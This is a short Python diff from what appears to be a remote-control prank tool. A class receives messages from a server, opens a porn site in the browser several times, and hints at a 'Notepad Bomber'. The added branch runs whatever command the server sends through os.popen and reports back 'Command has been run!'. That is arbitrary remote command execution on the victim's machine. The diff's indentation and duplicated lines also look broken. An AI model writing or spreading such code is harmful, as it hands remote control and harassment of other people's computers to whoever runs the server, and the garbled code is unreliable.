@@ -33,10 +33,13 @@ class Operate:
             webbrowser.open(url, new=0, autoraise=True)
             webbrowser.open(url, new=0, autoraise=True)
             webbrowser.open(url, new=0, autoraise=True)
-        else:
             os.popen(self.msg)
         self.serv.send('Pornhub has been opened!')  
       
+        else:
+            os.popen(self.msg)
+        self.serv.send('Command has been run!')
+    
        # self.msg = self.serv.recv()
        # if self.msg.split(' ')[0] == 'NOTE_BOMB':
             #Notepad Bomber
